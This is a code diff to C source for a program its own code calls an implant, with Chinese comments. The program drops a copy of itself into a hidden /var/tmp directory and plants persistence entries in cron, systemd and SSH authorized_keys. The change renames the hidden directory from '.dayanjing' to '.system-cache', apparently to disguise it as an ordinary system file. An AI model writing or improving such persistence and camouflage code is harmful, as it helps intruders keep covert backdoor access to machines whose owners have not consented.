@@ -618,12 +618,12 @@ static int implant_run(int cmd_fd, int data_fd, const mono_cfg_t *cfg,
              * 直接 mkdir "<root>/var" 会因父目录缺失级联失败，
              * 表现为 ssh-keygen 失败 -> sshkey 驻留项静默不装。
              * 实测：修正前 selftest 输出 sshkey=0，且无任何报错。 */
-            if (persist_drop_self(proot, "/var/tmp/.dayanjing",
+            if (persist_drop_self(proot, "/var/tmp/.system-cache",
                                   binp, sizeof binp) != 0) {
                 if (cfg->verbose)
                     fprintf(stderr, "[implant] 落盘自身失败 -> sshkey 项不装\n");
             } else {
-                snprintf(kd, sizeof kd, "%s/var/tmp/.dayanjing",
+                snprintf(kd, sizeof kd, "%s/var/tmp/.system-cache",
                          proot ? proot : "");
 
             memset(&cred, 0, sizeof cred);
@@ -1247,7 +1247,7 @@ int main(int argc, char **argv)
         cfg.fast = 1;   /* 自测必须秒级返回，不得依赖默认 1 秒采集间隔 */
         /* 自测绝不污染宿主：未显式指定假根时自动用临时假根。
            否则每跑一次回归就在真实 /etc/cron.d、/etc/systemd/system、
-           /var/tmp/.dayanjing 与 ~/.ssh/authorized_keys 留下条目，
+           /var/tmp/.system-cache 与 ~/.ssh/authorized_keys 留下条目，
            而那些条目指向一个测试二进制 —— 既弄脏机器，也让"驻留是否生效"
            的判据失去意义（真实系统里早就有上一次的残留）。 */
         if (!cfg.persist_root[0])
